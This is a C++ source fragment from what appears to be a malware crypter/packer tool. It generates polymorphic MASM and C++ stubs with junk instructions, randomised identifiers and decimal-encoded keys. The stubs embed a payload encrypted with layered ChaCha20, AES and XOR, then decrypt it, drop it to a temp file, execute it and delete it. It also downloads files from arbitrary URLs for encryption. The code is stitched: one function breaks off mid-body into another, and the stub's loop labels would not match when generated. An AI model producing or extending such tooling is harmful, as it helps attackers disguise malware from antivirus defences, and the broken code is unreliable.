    invoke ReadFile, file_handle, )" + bufferLabel + R"(, )" + sizeLabel + R"(, addr bytes_read, NULL
    invoke CloseHandle, file_handle
    
    ; More junk instructions
    mov ebx, 87654321h
    add ebx, 11111111h
    sub ebx, 11111111h
    
    call )" + decryptLabel + R"(
    call )" + execLabel + R"(
    
    invoke GlobalFree, )" + bufferLabel + R"(
    invoke ExitProcess, 0

)" + decryptLabel + R"(:
    ; Polymorphic decryption routine
    ; This is a simplified version - full implementation would include
    ; ChaCha20, AES stream cipher, and XOR algorithms
    
    mov esi, )" + bufferLabel + R"(
    mov ecx, )" + sizeLabel + R"(
    mov edx, 0
    
decrypt_loop_)" + std::to_string(rng() % 1000) + R"(:
    cmp ecx, 0
    je decrypt_done_)" + std::to_string(rng() % 1000) + R"(
    
    ; Simple XOR decryption (placeholder for full implementation)
    mov al, byte ptr [esi + edx]
    xor al, 55h  ; Simplified key
    mov byte ptr [esi + edx], al
    
    inc edx
    dec ecx
    jmp decrypt_loop_)" + std::to_string(rng() % 1000) + R"(
    
decrypt_done_)" + std::to_string(rng() % 1000) + R"(:
    ret

)" + execLabel + R"(:
    ; Write decrypted data to temp file
    invoke CreateFileA, addr temp_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    cmp eax, INVALID_HANDLE_VALUE
    je error_exit
    mov file_handle, eax
    
    invoke WriteFile, file_handle, )" + bufferLabel + R"(, )" + sizeLabel + R"(, addr bytes_read, NULL
    invoke CloseHandle, file_handle
    
    ; Execute the temp file
    mov startup_info.cb, sizeof STARTUPINFOA
    invoke CreateProcessA, addr temp_file, NULL, NULL, NULL, FALSE, 0, NULL, NULL, addr startup_info, addr process_info
    
    cmp eax, 0
    je error_exit
    
    invoke WaitForSingleObject, process_info.hProcess, INFINITE
    invoke CloseHandle, process_info.hProcess
    invoke CloseHandle, process_info.hThread
    
    ; Clean up temp file
    invoke DeleteFileA, addr temp_file
    ret

error_exit:
    invoke MessageBoxA, NULL, addr error_msg, addr error_msg, MB_OK
    invoke ExitProcess, 1

end )" + mainLabel + R"(
)";

        // Save the MASM stub
        std::string outputFile = "runtime_stub_" + std::to_string(rng() % 10000) + ".asm";
        std::ofstream outFile(outputFile);
        if (!outFile) {
            std::cout << "❌ Error: Cannot create output file " << outputFile << std::endl;
            return;
        }

        outFile << masmCode;
        outFile.close();

        std::cout << "✅ MASM Runtime Stub generated successfully!" << std::endl;
        std::cout << "📁 Output: " << outputFile << std::endl;
        std::cout << "🎯 Target file: " << targetFile << std::endl;
        std::cout << "🔢 Encryption order: " << keys.encryption_order << std::endl;
        std::cout << "📋 Assemble with: ml /c /coff " << outputFile << std::endl;
        std::cout << "📋 Link with: link /subsystem:windows " << outputFile.substr(0, outputFile.find('.')) << ".obj" << std::endl;
        std::cout << "⚠️  Note: This is a lightweight stub. Full decryption algorithms need manual implementation." << std::endl;
        
        // Auto-compile the generated MASM file
        autoCompile(outputFile);
    }

    // URL Crypto Service - AES (option 6)
    void urlCryptoServiceAES() {
        std::string url;
        std::cout << "Enter URL to download: ";
        std::getline(std::cin, url);

        std::vector<uint8_t> fileData;
        if (!downloadFile(url, fileData)) {
            std::cout << "❌ Failed to download file from URL" << std::endl;
            return;
        }

        // Generate AES key
        auto keys = generateKeys();
        std::vector<uint8_t> encryptedData = fileData;
        aesStreamCrypt(encryptedData, keys.aes_key);

        // Save encrypted file
        std::string outputFile = "url_encrypted_aes_" + std::to_string(rng() % 10000) + ".bin";
        std::ofstream outFile(outputFile, std::ios::binary);
        if (!outFile) {
            std::cout << "❌ Error: Cannot create output file " << outputFile << std::endl;
            return;
        }

        outFile.write(reinterpret_cast<const char*>(encryptedData.data()), encryptedData.size());
        outFile.close();

        // Save key information
        std::string keyFile = outputFile + ".key";
        std::ofstream keyOut(keyFile);
        if (keyOut) {
            keyOut << "AES Key (Decimal): " << bytesToBigDecimal(keys.aes_key) << std::endl;
            keyOut << "Original Size: " << fileData.size() << " bytes" << std::endl;
            keyOut << "Encrypted Size: " << encryptedData.size() << " bytes" << std::endl;
            keyOut.close();
        }

        std::cout << "✅ URL file encrypted with AES successfully!" << std::endl;
        std::cout << "📁 Encrypted file: " << outputFile << std::endl;
        std::cout << "🔑 Key file: " << keyFile << std::endl;
        std::cout << "💾 Original size: " << fileData.size() << " bytes" << std::endl;
        std::cout << "🔐 Encrypted size: " << encryptedData.size() << " bytes" << std::endl;
        std::cout << "🌐 Source URL: " << url << std::endl;
    }

    // URL Crypto Service - Triple Encryption (option 7)
    void urlCryptoServiceTriple() {
        std::string url;
        std::cout << "Enter URL to download: ";
        std::getline(std::cin, url);

        std::vector<uint8_t> fileData;
        if (!downloadFile(url, fileData)) {
            std::cout << "❌ Failed to download file from URL" << std::endl;
            return;
        }

        // Generate all keys
        auto keys = generateKeys();
        std::vector<uint8_t> encryptedData = fileData;
        
        // Apply triple encryption with randomized order
        switch (keys.encryption_order) {
            case 0: // ChaCha20 -> AES -> XOR
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                aesStreamCrypt(encryptedData, keys.aes_key);
                xorCrypt(encryptedData, keys.xor_key);
                break;
            case 1: // ChaCha20 -> XOR -> AES
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                xorCrypt(encryptedData, keys.xor_key);
                aesStreamCrypt(encryptedData, keys.aes_key);
                break;
            case 2: // AES -> ChaCha20 -> XOR
                aesStreamCrypt(encryptedData, keys.aes_key);
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                xorCrypt(encryptedData, keys.xor_key);
                break;
            case 3: // AES -> XOR -> ChaCha20
                aesStreamCrypt(encryptedData, keys.aes_key);
                xorCrypt(encryptedData, keys.xor_key);
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                break;
            case 4: // XOR -> ChaCha20 -> AES
                xorCrypt(encryptedData, keys.xor_key);
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                aesStreamCrypt(encryptedData, keys.aes_key);
                break;
            case 5: // XOR -> AES -> ChaCha20
                xorCrypt(encryptedData, keys.xor_key);
                aesStreamCrypt(encryptedData, keys.aes_key);
                chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());
                break;
        }

        // Save encrypted file
        std::string outputFile = "url_encrypted_triple_" + std::to_string(rng() % 10000) + ".bin";
        std::ofstream outFile(outputFile, std::ios::binary);
        if (!outFile) {
            std::cout << "❌ Error: Cannot create output file " << outputFile << std::endl;
            return;
        }

        outFile.write(reinterpret_cast<const char*>(encryptedData.data()), encryptedData.size());
        outFile.close();

        // Save key information
        std::string keyFile = outputFile + ".key";
        std::ofstream keyOut(keyFile);
        if (keyOut) {
            keyOut << "Triple Encryption Keys (Decimal):" << std::endl;
            keyOut << "ChaCha20 Key: " << bytesToBigDecimal(keys.chacha_key) << std::endl;
            keyOut << "ChaCha20 Nonce: " << bytesToBigDecimal(keys.chacha_nonce) << std::endl;
            keyOut << "AES Key: " << bytesToBigDecimal(keys.aes_key) << std::endl;
            keyOut << "XOR Key: " << bytesToBigDecimal(keys.xor_key) << std::endl;
            keyOut << "Encryption Order: " << keys.encryption_order << std::endl;
            keyOut << "Original Size: " << fileData.size() << " bytes" << std::endl;
            keyOut << "Encrypted Size: " << encryptedData.size() << " bytes" << std::endl;
            keyOut.close();
        }

        std::cout << "✅ URL file encrypted with Triple Encryption successfully!" << std::endl;
        std::cout << "📁 Encrypted file: " << outputFile << std::endl;
        std::cout << "🔑 Key file: " << keyFile << std::endl;
        std::cout << "💾 Original size: " << fileData.size() << " bytes" << std::endl;
        std::cout << "🔐 Encrypted size: " << encryptedData.size() << " bytes" << std::endl;
        std::cout << "🔢 Encryption order: " << keys.encryption_order << std::endl;
        std::cout << "🌐 Source URL: " << url << std::endl;
    }

    // URL Crypto Service - ChaCha20 (option 8)
    void urlCryptoServiceChaCha20() {
        std::string url;
        std::cout << "Enter URL to download: ";
        std::getline(std::cin, url);

        std::vector<uint8_t> fileData;
        if (!downloadFile(url, fileData)) {
            std::cout << "❌ Failed to download file from URL" << std::endl;
            return;
        }

        // Generate ChaCha20 key and nonce
        auto keys = generateKeys();
        std::vector<uint8_t> encryptedData = fileData;
        chacha20Crypt(encryptedData, keys.chacha_key.data(), keys.chacha_nonce.data());

        // Save encrypted file
        std::string outputFile = "url_encrypted_chacha20_" + std::to_string(rng() % 10000) + ".bin";
        std::ofstream outFile(outputFile, std::ios::binary);
        if (!outFile) {
            std::cout << "❌ Error: Cannot create output file " << outputFile << std::endl;
            return;
        }

        outFile.write(reinterpret_cast<const char*>(encryptedData.data()), encryptedData.size());
        outFile.close();

        // Save key information
        std::string keyFile = outputFile + ".key";
        std::ofstream keyOut(keyFile);
        if (keyOut) {
            keyOut << "ChaCha20 Key (Decimal): " << bytesToBigDecimal(keys.chacha_key) << std::endl;
            keyOut << "ChaCha20 Nonce (Decimal): " << bytesToBigDecimal(keys.chacha_nonce) << std::endl;
            keyOut << "Original Size: " << fileData.size() << " bytes" << std::endl;
            keyOut << "Encrypted Size: " << encryptedData.size() << " bytes" << std::endl;
            keyOut.close();
        }

        std::cout << "✅ URL file encrypted with ChaCha20 successfully!" << std::endl;
        std::cout << "📁 Encrypted file: " << outputFile << std::endl;
        std::cout << "🔑 Key file: " << keyFile << std::endl;
        std::cout << "💾 Original size: " << fileData.size() << " bytes" << std::endl;
        std::cout << "🔐 Encrypted size: " << encryptedData.size() << " bytes" << std::endl;
        std::cout << "🌐 Source URL: " << url << std::endl;
    }

    // URL Crypto Service - Basic (option 9)
    void urlCryptoServiceBasic() {
        std::string url;
        std::cout << "Enter URL to download: ";
        std::getline(std::cin, url);

        std::vector<uint8_t> fileData;
        if (!downloadFile(url, fileData)) {
            std::cout << "❌ Failed to download file from URL" << std::endl;
            return;
        }

        // Generate keys and apply basic encryption
        auto keys = generateKeys();
        std::vector<uint8_t> encryptedData = fileData;
        
        // Apply simple XOR encryption for basic mode
        xorCrypt(encryptedData, keys.xor_key);

        // Save encrypted file
        std::string outputFile = "url_encrypted_basic_" + std::to_string(rng() % 10000) + ".bin";
        std::ofstream outFile(outputFile, std::ios::binary);
        if (!outFile) {
            std::cout << "❌ Error: Cannot create output file " << outputFile << std::endl;
            return;
        }

        outFile.write(reinterpret_cast<const char*>(encryptedData.data()), encryptedData.size());
        outFile.close();

        // Save key information
        std::string keyFile = outputFile + ".key";
        std::ofstream keyOut(keyFile);
        if (keyOut) {
            keyOut << "Basic XOR Key (Decimal): " << bytesToBigDecimal(keys.xor_key) << std::endl;
            keyOut << "Original Size: " << fileData.size() << " bytes" << std::endl;
            keyOut << "Encrypted Size: " << encryptedData.size() << " bytes" << std::endl;
            keyOut.close();
        }

        std::cout << "✅ URL file encrypted with Basic encryption successfully!" << std::endl;
        std::cout << "📁 Encrypted file: " << outputFile << std::endl;
        std::cout << "🔑 Key file: " << keyFile << std::endl;
        std::cout << "💾 Original size: " << fileData.size() << " bytes" << std::endl;
        std::cout << "🔐 Encrypted size: " << encryptedData.size() << " bytes" << std::endl;
        std::cout << "🌐 Source URL: " << url << std::endl;
    }
    // URL Pack File - AES (option 10)
    void urlPackFileAES() {
        std::string url;

    // AES Packer (option 1) - Works like UPX
    void generateAESPacker() {
        std::string inputFile;
        std::cout << "Enter input file path: ";
        std::getline(std::cin, inputFile);

        std::ifstream file(inputFile, std::ios::binary);
        if (!file) {
            std::cout << "❌ Error: Cannot open file " << inputFile << std::endl;
            return;
        }

        std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();

        // Generate AES key
        auto keys = generateKeys();
        std::vector<uint8_t> encryptedData = fileData;
        aesStreamCrypt(encryptedData, keys.aes_key);

        // Convert key to decimal for obfuscation
        std::string keyDecimal = bytesToBigDecimal(keys.aes_key);

        // Generate unique variable names
        std::string payloadVar = generateUniqueVarName();
        std::string keyVar = generateUniqueVarName();
        std::string sizeVar = generateUniqueVarName();
        std::string bufferVar = generateUniqueVarName();
        std::string funcName = generateUniqueVarName();

        // Create the packed executable source
        std::string sourceCode = R"(#include <iostream>
#include <vector>
#include <fstream>
#include <cstring>
#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#include <sys/stat.h>
#include <cstdlib>
#endif

void )" + funcName + R"()(std::vector<unsigned char>& data, const std::vector<unsigned char>& key) {
    static const unsigned char sbox[256] = {
        0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
        0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
        0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
        0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
        0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
        0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
        0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
        0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
        0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
        0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
        0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
        0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
        0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
        0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
        0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
        0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
    };
    
    for (size_t i = 0; i < data.size(); i++) {
        unsigned char keyByte = key[i % key.size()];
        unsigned char nonceByte = (i >> 8) ^ (i & 0xFF);
        unsigned char mixedKey = sbox[keyByte] ^ nonceByte;
        data[i] ^= mixedKey;
    }
}

std::vector<unsigned char> )" + keyVar + R"(FromDecimal(const std::string& decimal) {
    std::vector<unsigned char> result;
    std::vector<int> bigNum;
    
    for (char c : decimal) bigNum.push_back(c - '0');
    
    while (!bigNum.empty() && !(bigNum.size() == 1 && bigNum[0] == 0)) {
        int remainder = 0;
        for (size_t i = 0; i < bigNum.size(); i++) {
            int current = remainder * 10 + bigNum[i];
            bigNum[i] = current / 256;
            remainder = current % 256;
        }
        result.insert(result.begin(), remainder);
        while (!bigNum.empty() && bigNum[0] == 0) bigNum.erase(bigNum.begin());
    }
    
    return result;
}

int main() {
    const std::string )" + keyVar + R"( = ")" + keyDecimal + R"(";
    const unsigned int )" + sizeVar + R"( = )" + std::to_string(encryptedData.size()) + R"(;
    
    unsigned char )" + payloadVar + R"([)" + std::to_string(encryptedData.size()) + R"(] = {)";

        // Embed the encrypted payload
        for (size_t i = 0; i < encryptedData.size(); i++) {
            if (i % 16 == 0) sourceCode += "\n        ";
            sourceCode += "0x" + 
                std::string(1, "0123456789ABCDEF"[(encryptedData[i] >> 4) & 0xF]) + 
                std::string(1, "0123456789ABCDEF"[encryptedData[i] & 0xF]);
            if (i < encryptedData.size() - 1) sourceCode += ",";
        }

        sourceCode += R"(
    };
    
    std::vector<unsigned char> )" + bufferVar + R"(()" + payloadVar + R"(, )" + payloadVar + R"( + )" + sizeVar + R"();
    std::vector<unsigned char> keyBytes = )" + keyVar + R"(FromDecimal()" + keyVar + R"();
    
    )" + funcName + R"()()" + bufferVar + R"(, keyBytes);
    
#ifdef _WIN32
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string tempFile = std::string(tempPath) + "\\upx_temp_" + std::to_string(GetCurrentProcessId()) + ".exe";
#else
    std::string tempFile = "/tmp/upx_temp_" + std::to_string(getpid());
#endif
    
    std::ofstream outFile(tempFile, std::ios::binary);
    if (!outFile) return 1;
    
    outFile.write(reinterpret_cast<const char*>()" + bufferVar + R"(.data()), )" + bufferVar + R"(.size());
    outFile.close();
    
#ifdef _WIN32
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    if (CreateProcessA(tempFile.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    DeleteFileA(tempFile.c_str());
#else
    chmod(tempFile.c_str(), 0755);
    system(tempFile.c_str());
    unlink(tempFile.c_str());
#endif
    
    return 0;
})";

        // Save the packed executable source
        std::filesystem::path inputPath(inputFile);
        std::string outputFile = inputPath.stem().string() + "_packed.cpp";
        
        std::ofstream outFile(outputFile);
        if (!outFile) {
            std::cout << "❌ Error: Cannot create output file " << outputFile << std::endl;
            return;
        }

        outFile << sourceCode;
        outFile.close();

        std::cout << "✅ AES Packer generated successfully!" << std::endl;
        std::cout << "📁 Output: " << outputFile << std::endl;
        std::cout << "💾 Original size: " << fileData.size() << " bytes" << std::endl;
        std::cout << "🔐 Encrypted size: " << encryptedData.size() << " bytes" << std::endl;
        std::cout << "📋 Compile with: g++ -O2 " << outputFile << " -o " << inputPath.stem().string() << "_packed.exe" << std::endl;
        
        // Auto-compile the generated source file
        autoCompile(outputFile);
    }
